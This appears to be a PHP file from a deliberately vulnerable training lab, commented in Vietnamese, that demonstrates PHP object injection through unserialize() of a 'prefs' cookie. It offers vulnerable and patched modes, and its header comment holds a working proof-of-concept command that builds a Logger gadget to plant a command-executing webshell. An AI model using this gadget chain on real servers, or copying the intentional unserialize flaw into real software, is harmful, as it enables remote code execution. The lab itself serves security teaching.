<?php
/*
 * LAB 5 - PHP OBJECT INJECTION / Insecure Deserialization
 *         (CWE-502, OWASP A08, ATT&CK T1059)
 * ---------------------------------------------------------------------------
 * Kịch bản: ứng dụng lưu "preferences" của người dùng dưới dạng chuỗi serialize
 *           trong cookie, rồi unserialize() khi tải trang.
 * LỖI: unserialize() dữ liệu người dùng -> kẻ tấn công tạo object của class có
 *      magic method nguy hiểm (__destruct/__wakeup) -> "gadget" -> ghi file/RCE.
 *
 * GADGET demo: class Logger có __destruct() ghi $this->data ra $this->file.
 *   -> Nếu điều khiển được file + data, ghi webshell vào webroot.
 *
 * KHAI THÁC (PoC) — tạo payload bằng PHP cục bộ rồi đặt vào cookie 'prefs':
 *   php -r '
 *     class Logger { public $file; public $data; }
 *     $o = new Logger();
 *     $o->file = "/var/www/html/vuln/uploads/poi.php";
 *     $o->data = "<?php system(\$_GET[\"c\"]); ?>";
 *     echo urlencode(serialize($o));
 *   '
 *   Rồi: đặt cookie prefs=<chuỗi trên>, tải lại trang này, gọi:
 *        /vuln/uploads/poi.php?c=id
 *
 * CÁCH VÁ (nhánh 'safe'):
 *   - KHÔNG unserialize() dữ liệu không tin cậy. Dùng json_encode/json_decode.
 *   - Nếu buộc phải: unserialize($data, ['allowed_classes' => false]) hoặc danh sách class trắng.
 *   - Ký (HMAC) dữ liệu để chống giả mạo.
 */

class Logger {
    public $file = '/tmp/app.log';
    public $data = '';
    // magic method chạy khi object bị huỷ -> gadget ghi file
    public function __destruct() {
        if ($this->file && $this->data !== '') {
            @file_put_contents($this->file, $this->data);
        }
    }
}

$mode  = $_GET['mode'] ?? 'vuln';
$prefs = $_COOKIE['prefs'] ?? '';
$note  = '';

if ($prefs !== '') {
    if ($mode === 'safe') {
        // --- Bản vá: không cho khôi phục object tuỳ ý ---
        $obj = unserialize($prefs, ['allowed_classes' => false]);
        $note = 'safe: allowed_classes=false -> object bị chặn, chỉ nhận dữ liệu thường.';
    } else {
        // === LỖI CỐ Ý: unserialize dữ liệu người dùng ===
        $obj = unserialize($prefs);   // Logger::__destruct sẽ chạy ở cuối request
        $note = 'vuln: đã unserialize cookie prefs (gadget Logger sẽ kích hoạt).';
    }
}

// Cho phép set nhanh một prefs "lành" để thử nghiệm
if (isset($_GET['setdemo'])) {
    setcookie('prefs', serialize(['theme' => 'dark']));
    $note = 'Đã set cookie prefs demo (theme=dark). Tải lại trang.';
}
?>
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>unserialize</title>
<style>body{font-family:Arial;max-width:760px;margin:30px auto}code{background:#f0f0f0;padding:2px 4px}</style></head><body>
<h2>Lab 5 — Preferences (PHP Object Injection)</h2>
<p>Chế độ: <b><?= htmlspecialchars($mode) ?></b> — <a href="?mode=vuln">vuln</a> | <a href="?mode=safe">safe</a></p>
<p>Cookie <code>prefs</code> hiện tại: <code><?= htmlspecialchars($prefs ?: '(trống)') ?></code></p>
<p><a href="?mode=<?= htmlspecialchars($mode) ?>&setdemo=1">Set cookie prefs demo</a></p>
<?php if ($note): ?><p><b><?= htmlspecialchars($note) ?></b></p><?php endif; ?>
<p><small>Xem comment đầu file để lấy lệnh tạo payload gadget.</small></p>
<p><a href="index.php">&larr; Menu</a></p>
</body></html>
